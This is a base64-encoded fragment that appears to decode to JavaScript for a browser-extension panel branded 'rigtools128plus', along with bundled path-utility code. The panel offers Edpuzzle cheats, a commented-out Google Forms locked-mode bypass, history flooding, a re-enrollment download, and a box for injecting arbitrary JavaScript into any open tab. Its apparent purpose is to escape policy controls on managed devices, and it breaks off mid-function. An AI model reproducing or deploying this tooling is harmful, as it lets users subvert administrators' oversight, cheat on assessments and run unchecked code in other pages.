9PT0gMCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdENvbW1vblNlcCA9IDA7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdmFyIGZyb21Db2RlID0gZnJvbS5jaGFyQ29kZUF0KGZyb21TdGFydCArIGkpOwogICAgICAgICAgICB2YXIgdG9Db2RlID0gdG8uY2hhckNvZGVBdCh0b1N0YXJ0ICsgaSk7CiAgICAgICAgICAgIGlmIChmcm9tQ29kZSAhPT0gdG9Db2RlKQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGVsc2UgaWYgKGZyb21Db2RlID09PSA0NykKICAgICAgICAgICAgICAgIGxhc3RDb21tb25TZXAgPSBpOwogICAgICAgIH0KICAgICAgICB2YXIgb3V0ID0gJyc7CgogICAgICAgIGZvciAoaSA9IGZyb21TdGFydCArIGxhc3RDb21tb25TZXAgKyAxOyBpIDw9IGZyb21FbmQ7ICsraSkgewogICAgICAgICAgICBpZiAoaSA9PT0gZnJvbUVuZCB8fCBmcm9tLmNoYXJDb2RlQXQoaSkgPT09IDQ3KSB7CiAgICAgICAgICAgICAgICBpZiAob3V0Lmxlbmd0aCA9PT0gMCkKICAgICAgICAgICAgICAgICAgICBvdXQgKz0gJy4uJzsKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBvdXQgKz0gJy8uLic7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmIChvdXQubGVuZ3RoID4gMCkKICAgICAgICAgICAgcmV0dXJuIG91dCArIHRvLnNsaWNlKHRvU3RhcnQgKyBsYXN0Q29tbW9uU2VwKTsKICAgICAgICBlbHNlIHsKICAgICAgICAgICAgdG9TdGFydCArPSBsYXN0Q29tbW9uU2VwOwogICAgICAgICAgICBpZiAodG8uY2hhckNvZGVBdCh0b1N0YXJ0KSA9PT0gNDcpCiAgICAgICAgICAgICAgICArK3RvU3RhcnQ7CiAgICAgICAgICAgIHJldHVybiB0by5zbGljZSh0b1N0YXJ0KTsKICAgICAgICB9CiAgICB9LAogICAgX21ha2VMb25nOiBmdW5jdGlvbiBfbWFrZUxvbmcocGF0aCkgewogICAgICAgIHJldHVybiBwYXRoOwogICAgfSwKICAgIGRpcm5hbWU6IGZ1bmN0aW9uIGRpcm5hbWUocGF0aCkgewogICAgICAgIGFzc2VydFBhdGgocGF0aCk7CiAgICAgICAgaWYgKHBhdGgubGVuZ3RoID09PSAwKSByZXR1cm4gJy4nOwogICAgICAgIHZhciBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KDApOwogICAgICAgIHZhciBoYXNSb290ID0gY29kZSA9PT0gNDc7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwogICAgICAgIGZvciAodmFyIGkgPSBwYXRoLmxlbmd0aCAtIDE7IGkgPj0gMTsgLS1pKSB7CiAgICAgICAgICAgIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewogICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICBlbmQgPSBpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChlbmQgPT09IC0xKSByZXR1cm4gaGFzUm9vdCA/ICcvJyA6ICcuJzsKICAgICAgICBpZiAoaGFzUm9vdCAmJiBlbmQgPT09IDEpIHJldHVybiAnLy8nOwogICAgICAgIHJldHVybiBwYXRoLnNsaWNlKDAsIGVuZCk7CiAgICB9LAogICAgYmFzZW5hbWU6IGZ1bmN0aW9uIGJhc2VuYW1lKHBhdGgsIGV4dCkgewogICAgICAgIGlmIChleHQgIT09IHVuZGVmaW5lZCAmJiB0eXBlb2YgZXh0ICE9PSAnc3RyaW5nJykgdGhyb3cgbmV3IFR5cGVFcnJvcignImV4dCIgYXJndW1lbnQgbXVzdCBiZSBhIHN0cmluZycpOwoKICAgICAgICB2YXIgc3RhcnQgPSAwOwogICAgICAgIHZhciBlbmQgPSAtMTsKICAgICAgICB2YXIgbWF0Y2hlZFNsYXNoID0gdHJ1ZTsKICAgICAgICB2YXIgaTsKICAgICAgICBpZiAoZXh0ICE9PSB1bmRlZmluZWQgJiYgZXh0Lmxlbmd0aCA+IDAgJiYgZXh0Lmxlbmd0aCA8PSBwYXRoLmxlbmd0aCkgewogICAgICAgICAgICBpZiAoZXh0Lmxlbmd0aCA9PT0gcGF0aC5sZW5ndGggJiYgZXh0ID09PSBwYXRoKSByZXR1cm4gJyc7CiAgICAgICAgICAgIHZhciBleHRJZHggPSBleHQubGVuZ3RoIC0gMTsKICAgICAgICAgICAgdmFyIGZpcnN0Tm9uU2xhc2hFbmQgPSAtMTsKICAgICAgICAgICAgZm9yIChpID0gcGF0aC5sZW5ndGggLSAxOyBpID49IDA7IC0taSkgewogICAgICAgICAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgICAgICBpZiAoY29kZSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICAgICAgaWYgKCFtYXRjaGVkU2xhc2gpIHsKICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpZiAoZmlyc3ROb25TbGFzaEVuZCA9PT0gLTEpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBmaXJzdE5vblNsYXNoRW5kID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmIChleHRJZHggPj0gMCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvZGUgPT09IGV4dC5jaGFyQ29kZUF0KGV4dElkeCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtLWV4dElkeCA9PT0gLTEpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kID0gaTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRJZHggPSAtMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCA9IGZpcnN0Tm9uU2xhc2hFbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHN0YXJ0ID09PSBlbmQpIGVuZCA9IGZpcnN0Tm9uU2xhc2hFbmQ7CiAgICAgICAgICAgIGVsc2UgaWYgKGVuZCA9PT0gLTEpIGVuZCA9IHBhdGgubGVuZ3RoOwogICAgICAgICAgICByZXR1cm4gcGF0aC5zbGljZShzdGFydCwgZW5kKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBmb3IgKGkgPSBwYXRoLmxlbmd0aCAtIDE7IGkgPj0gMDsgLS1pKSB7CiAgICAgICAgICAgICAgICBpZiAocGF0aC5jaGFyQ29kZUF0KGkpID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgICAgICBzdGFydCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGVuZCA9PT0gLTEpIHsKCiAgICAgICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgZW5kID0gaSArIDE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGVuZCA9PT0gLTEpIHJldHVybiAnJzsKICAgICAgICAgICAgcmV0dXJuIHBhdGguc2xpY2Uoc3RhcnQsIGVuZCk7CiAgICAgICAgfQogICAgfSwKICAgIGV4dG5hbWU6IGZ1bmN0aW9uIGV4dG5hbWUocGF0aCkgewogICAgICAgIGFzc2VydFBhdGgocGF0aCk7CiAgICAgICAgdmFyIHN0YXJ0RG90ID0gLTE7CiAgICAgICAgdmFyIHN0YXJ0UGFydCA9IDA7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwoKICAgICAgICB2YXIgcHJlRG90U3RhdGUgPSAwOwogICAgICAgIGZvciAodmFyIGkgPSBwYXRoLmxlbmd0aCAtIDE7IGkgPj0gMDsgLS1pKSB7CiAgICAgICAgICAgIHZhciBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgIHN0YXJ0UGFydCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGVuZCA9PT0gLTEpIHsKCiAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgICAgIGVuZCA9IGkgKyAxOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NikgewoKICAgICAgICAgICAgICAgIGlmIChzdGFydERvdCA9PT0gLTEpCiAgICAgICAgICAgICAgICAgICAgc3RhcnREb3QgPSBpOwogICAgICAgICAgICAgICAgZWxzZSBpZiAocHJlRG90U3RhdGUgIT09IDEpCiAgICAgICAgICAgICAgICAgICAgcHJlRG90U3RhdGUgPSAxOwogICAgICAgICAgICB9IGVsc2UgaWYgKHN0YXJ0RG90ICE9PSAtMSkgewoKICAgICAgICAgICAgICAgIHByZURvdFN0YXRlID0gLTE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSB8fCBlbmQgPT09IC0xIHx8CgogICAgICAgICAgICBwcmVEb3RTdGF0ZSA9PT0gMCB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDEgJiYgc3RhcnREb3QgPT09IGVuZCAtIDEgJiYgc3RhcnREb3QgPT09IHN0YXJ0UGFydCArIDEpIHsKICAgICAgICAgICAgcmV0dXJuICcnOwogICAgICAgIH0KICAgICAgICByZXR1cm4gcGF0aC5zbGljZShzdGFydERvdCwgZW5kKTsKICAgIH0sCiAgICBmb3JtYXQ6IGZ1bmN0aW9uIGZvcm1hdChwYXRoT2JqZWN0KSB7CiAgICAgICAgaWYgKHBhdGhPYmplY3QgPT09IG51bGwgfHwgdHlwZW9mIHBhdGhPYmplY3QgIT09ICdvYmplY3QnKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBUeXBlRXJyb3IoJ1RoZSAicGF0aE9iamVjdCIgYXJndW1lbnQgbXVzdCBiZSBvZiB0eXBlIE9iamVjdC4gUmVjZWl2ZWQgdHlwZSAnICsgdHlwZW9mIHBhdGhPYmplY3QpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gX2Zvcm1hdCgnLycsIHBhdGhPYmplY3QpOwogICAgfSwKICAgIHBhcnNlOiBmdW5jdGlvbiBwYXJzZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICB2YXIgcmV0ID0gewogICAgICAgICAgICByb290OiAnJywKICAgICAgICAgICAgZGlyOiAnJywKICAgICAgICAgICAgYmFzZTogJycsCiAgICAgICAgICAgIGV4dDogJycsCiAgICAgICAgICAgIG5hbWU6ICcnCiAgICAgICAgfTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDApIHJldHVybiByZXQ7CiAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoMCk7CiAgICAgICAgdmFyIGlzQWJzb2x1dGUgPSBjb2RlID09PSA0NzsKICAgICAgICB2YXIgc3RhcnQ7CiAgICAgICAgaWYgKGlzQWJzb2x1dGUpIHsKICAgICAgICAgICAgcmV0LnJvb3QgPSAnLyc7CiAgICAgICAgICAgIHN0YXJ0ID0gMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBzdGFydCA9IDA7CiAgICAgICAgfQogICAgICAgIHZhciBzdGFydERvdCA9IC0xOwogICAgICAgIHZhciBzdGFydFBhcnQgPSAwOwogICAgICAgIHZhciBlbmQgPSAtMTsKICAgICAgICB2YXIgbWF0Y2hlZFNsYXNoID0gdHJ1ZTsKICAgICAgICB2YXIgaSA9IHBhdGgubGVuZ3RoIC0gMTsKCiAgICAgICAgdmFyIHByZURvdFN0YXRlID0gMDsKCiAgICAgICAgZm9yICg7IGkgPj0gc3RhcnQ7IC0taSkgewogICAgICAgICAgICBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgICAgICBpZiAoY29kZSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgIHN0YXJ0UGFydCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGVuZCA9PT0gLTEpIHsKCiAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgICAgIGVuZCA9IGkgKyAxOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NikgewoKICAgICAgICAgICAgICAgIGlmIChzdGFydERvdCA9PT0gLTEpIHN0YXJ0RG90ID0gaTsKICAgICAgICAgICAgICAgIGVsc2UgaWYgKHByZURvdFN0YXRlICE9PSAxKSBwcmVEb3RTdGF0ZSA9IDE7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhcnREb3QgIT09IC0xKSB7CgogICAgICAgICAgICAgICAgcHJlRG90U3RhdGUgPSAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xIHx8IGVuZCA9PT0gLTEgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAwIHx8CgogICAgICAgICAgICBwcmVEb3RTdGF0ZSA9PT0gMSAmJiBzdGFydERvdCA9PT0gZW5kIC0gMSAmJiBzdGFydERvdCA9PT0gc3RhcnRQYXJ0ICsgMSkgewogICAgICAgICAgICBpZiAoZW5kICE9PSAtMSkgewogICAgICAgICAgICAgICAgaWYgKHN0YXJ0UGFydCA9PT0gMCAmJiBpc0Fic29sdXRlKSByZXQuYmFzZSA9IHJldC5uYW1lID0gcGF0aC5zbGljZSgxLCBlbmQpOwogICAgICAgICAgICAgICAgZWxzZSByZXQuYmFzZSA9IHJldC5uYW1lID0gcGF0aC5zbGljZShzdGFydFBhcnQsIGVuZCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoc3RhcnRQYXJ0ID09PSAwICYmIGlzQWJzb2x1dGUpIHsKICAgICAgICAgICAgICAgIHJldC5uYW1lID0gcGF0aC5zbGljZSgxLCBzdGFydERvdCk7CiAgICAgICAgICAgICAgICByZXQuYmFzZSA9IHBhdGguc2xpY2UoMSwgZW5kKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHJldC5uYW1lID0gcGF0aC5zbGljZShzdGFydFBhcnQsIHN0YXJ0RG90KTsKICAgICAgICAgICAgICAgIHJldC5iYXNlID0gcGF0aC5zbGljZShzdGFydFBhcnQsIGVuZCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0LmV4dCA9IHBhdGguc2xpY2Uoc3RhcnREb3QsIGVuZCk7CiAgICAgICAgfQogICAgICAgIGlmIChzdGFydFBhcnQgPiAwKSByZXQuZGlyID0gcGF0aC5zbGljZSgwLCBzdGFydFBhcnQgLSAxKTsKICAgICAgICBlbHNlIGlmIChpc0Fic29sdXRlKSByZXQuZGlyID0gJy8nOwogICAgICAgIHJldHVybiByZXQ7CiAgICB9LAogICAgc2VwOiAnLycsCiAgICBkZWxpbWl0ZXI6ICc6JywKICAgIHdpbjMyOiBudWxsLAogICAgcG9zaXg6IG51bGwKfTsKY29uc3Qgc2xpZGVzID0gW107CmxldCBhY3RpdmVTbGlkZUlkeCA9IDA7CmNvbnN0IGhhbmRsZUNhbGxiYWNrc18gPSBbXTsKY29uc3QgV0FJVF9GT1JfRklOSVNIID0gMTsKcmVxdWVzdEFuaW1hdGlvbkZyYW1lKGZ1bmN0aW9uIGEodCkgewogICAgZm9yIChjb25zdCBjYiBvZiBoYW5kbGVDYWxsYmFja3NfKSB7CiAgICAgICAgbGV0IG07CiAgICAgICAgaWYgKChtID0gY2IuZi5hcHBseShudWxsLCBbdCAtIGNiLnRdKSkpIHsKICAgICAgICAgICAgaWYgKG0gPT09IDEpIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGhhbmRsZUNhbGxiYWNrc18uc3BsaWNlKGhhbmRsZUNhbGxiYWNrc18uaW5kZXhPZihjYiksIDEpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKGEpOwp9KTsKY29uc3QgaGFuZGxlSW5BbmltYXRpb25GcmFtZSA9IChjYiwgdGhpeiA9IG51bGwsIGFyZ3MgPSBbXSkgPT4gewogICAgaGFuZGxlQ2FsbGJhY2tzXy5wdXNoKHsKICAgICAgICBmOiBjYiwKICAgICAgICB0OiBwZXJmb3JtYW5jZS5ub3coKSwKICAgIH0pOwp9OwoKY2xhc3MgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcyB7CiAgICBzdGF0aWMgdGVtcGxhdGUgPSBgCiAgPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KICA8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2RvY3MuaWNvIj4KICA8ZGl2IGlkPSJleHRfZGVmYXVsdCI+CiAgICA8ZGl2IGlkPSJkZWZhdWx0X2V4dGVuc2lvbl9jYXBhYmlsaXRpZXMiPgogICAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgICAgIDxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLXJpZ3Rvb2xzMTI4cGx1cy9yZWZzL2hlYWRzL21haW4vaGFydG9vbHMuZ2lmIiBhbHQ9IkhhclRvb2xzIExvZ28iIGNsYXNzPSJsb2dvIiAvPgogICAgICAgIDxoMT4gRGVmYXVsdCBFeHRlbnNpb24gQ2FwYWJpbGl0aWVzIDwvaDE+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGlkPSJ0YWJzLWJ1dHRvbnMiPgogICAgICAgIDxwPk9uIHRhYiB1cGRhdGU8L3A+CiAgICAgICAgPGRpdiBpZD0idG9nZ2xlYWJsZS1idXR0b25zIj4gCgkJPHdoaXRlYnV0dG9ucz4KICAgICAgICAgIDxidXR0b24gaWQ9ImVydWRhIj5FcnVkYTwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBpZD0iY2hpaSI+Q2hpaTwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBpZD0iYWRibG9jayI+QWRibG9jazwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBpZD0iZWRwdXp6bGUiPkVkcHV6emxlIGhheDwvYnV0dG9uPgogICAgICAgICAgPCEtLSA8YnV0dG9uIGlkPSJnbG9ja2VkIj5HZm9ybXMgTG9ja2VkIE1vZGUgYnlwYXNzPC9idXR0b24+IC0tPgoJCTwvd2hpdGVidXR0b25zPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBpZD0ib3RoZXItYnV0dG9ucyI+CiAgICAgICAgPHA+T3RoZXIgc2NyaXB0czwvcD4KCQk8d2hpdGVidXR0b25zPgogICAgICAgIDxidXR0b24gaWQ9InN3YW1wIj5Td2FtcDwvYnV0dG9uPgogICAgICAgIDxidXR0b24gaWQ9InVwZGF0ZSI+VXBkYXRlIFJpZ3Rvb2xzPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBpZD0icXVpY2stcm12LWJsdCI+UXVpY2sgUmVtb3ZlIEJsb2F0ICh1c2VkIHcvIGdmb3JtcyBleHRlbik8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGlkPSJoc3RmbGQiPkhpc3RvcnkgRmxvb2Q8L2J1dHRvbj4KCQk8L3doaXRlYnV0dG9ucz4KICAgICAgPC9kaXY+CiAgICAgIDxoMj5FdmFsdWF0ZSBjb2RlPC9oMT4KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgPHRleHRhcmVhIGlkPSJjb2RlIiBwbGFjZWhvbGRlcj0iRW50ZXIgSmF2YVNjcmlwdCB0byBpbmplY3QiPjwvdGV4dGFyZWE+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGJ1dHRvbiBpZD0iY29kZS1ydW4iPlJ1bjwvYnV0dG9uPgogICAgICAgICA8aDI+IFJpaWVucm9sbG1lbnQgPC9oMj4KICAgICAgICA8YnV0dG9uIGlkPSJmb3JyZWVucm9sbCI+IERvd25sb2FkIHppcCA8L2J1dHRvbj4KICAgICAgICA8ZGl2IGlkPSJjb2RlLW91dHB1dCI+PC9kaXY+CgogICAgPC9kaXY+CiAgICA8ZGl2IGlkPSJleHRlbnNpb25fdGFic19kZWZhdWx0Ij4KICAgICAgPGJ1dHRvbiBpZD0idGFicmVsb2FkIj5SZWZyZXNoIFRhYnM8L2J1dHRvbj4KICAgICAgPHVsPgogICAgICA8L3VsPgogICAgICA8aW5wdXQgaWQ9IlRhYlVSTElucHV0Ii8+IDxidXR0b24gaWQ9IlRhYlVSTFN1Ym1pdCI+Q3JlYXRlPC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KICBgOwogICAgdXBkYXRlVGFiTGlzdCgpIHsKICAgICAgICBpZiAodGhpcy5kaXNhcm1lZCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpZiAodGhpcy50YWJMaXN0SW5Qcm9ncmVzcykgewoKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICB0aGlzLnRhYkxpc3RJblByb2dyZXNzID0gdHJ1ZTsKCiAgICAgICAgY29uc3QgdGFibGlzdCA9IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V4dGVuc2lvbl90YWJzX2RlZmF1bHQgdWwiKTsKCiAgICAgICAgdGFibGlzdC5pbm5lckhUTUwgPSAiIjsKICAgICAgICBjb25zdCB0aGl6ID0gdGhpczsKICAgICAgICBjaHJvbWUud2luZG93cy5nZXRBbGwoZnVuY3Rpb24od2luKSB7CiAgICAgICAgICAgIHdpbi5mb3JFYWNoKGZ1bmN0aW9uKHYpIHsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnF1ZXJ5KHsKICAgICAgICAgICAgICAgICAgICB3aW5kb3dJZDogdi5pZAogICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24odGFiSW5mb3MpIHsKICAgICAgICAgICAgICAgICAgICB0YWJJbmZvcy5mb3JFYWNoKGZ1bmN0aW9uKGluZm8pIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5jbGFzc05hbWUgPSAidGFibGlzdC1pdGVtIjsKICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmlubmVySFRNTCA9IGA8aW1nICR7CiAgICAgICAgICAgICAgY2hyb21lLnRhYnMgJiYgKGluZm8uZmF2SWNvblVybD8ubGVuZ3RoID8/IDApID4gMAogICAgICAgICAgICAgICAgPyBgc3JjPSIke2luZm8uZmF2SWNvblVybH0iYAogICAgICAgICAgICAgICAgOiAiIgogICAgICAgICAgICB9Lz48c3BhbiBjbGFzcz0idGFiLW5hbWUiPiR7aW5mby50aXRsZX0gPGxpdHN0dWZmPiAke2luZm8udXJsfTxsaXRzdHVmZj48L3NwYW4+YDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5zY3JpcHRpbmcgfHwgY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcnVuQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5CdXR0b24udGV4dENvbnRlbnQgPSAiUnVuIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJ1bkJ1dHRvbi5vbmNsaWNrID0gKCkgPT4gcnVuQ29kZSh0cnVlLCBpbmZvLmlkKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5hcHBlbmRDaGlsZChydW5CdXR0b24pOwogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2aWV3QnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICAgICAgICAgICAgICAgICAgICAgIHByZXZpZXdCdXR0b24udGV4dENvbnRlbnQgPSAiUHJldmlldyI7CgogICAgICAgICAgICAgICAgICAgICAgICBwcmV2aWV3QnV0dG9uLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IHRydWU7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gdHJ1ZTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUud2luZG93cy51cGRhdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mby53aW5kb3dJZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2N1c2VkOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZShpbmZvLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jdXJyZW50VGltZW91dCA9IHNldFRpbWVvdXQoZnVuY3Rpb24gbSgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhclRpbWVvdXQod2luZG93LmN1cnJlbnRUaW1lb3V0KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMuZ2V0Q3VycmVudChmdW5jdGlvbih0YWIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFiLndpbmRvd0lkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9jdXNlZDogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy51cGRhdGUodGFiLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGl2ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg